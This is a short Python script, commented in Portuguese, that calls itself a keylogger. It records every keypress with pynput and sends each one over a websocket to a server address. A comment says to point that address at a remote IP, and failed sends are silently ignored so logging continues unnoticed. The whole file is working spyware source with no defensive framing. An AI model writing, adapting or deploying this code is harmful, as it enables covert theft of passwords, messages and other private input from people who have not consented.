import asyncio
import websockets
from pynput import keyboard

SERVER_URL = "ws://localhost:8765"  # Altere para o IP do servidor se necessário

async def enviar_dado(dado):
    try:
        async with websockets.connect(SERVER_URL) as websocket:
            await websocket.send(dado)
    except:
        pass  # Evita erro caso o servidor esteja offline

def on_press(key):
    try:
        # Transforma a tecla em string
        if hasattr(key, 'char') and key.char is not None:
            tecla = key.char
        else:
            tecla = f"[{key}]"

        # Envia a tecla capturada para o servidor
        asyncio.run(enviar_dado(tecla))

    except Exception as e:
        print(f"Erro ao capturar tecla: {e}")

# Inicia o keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
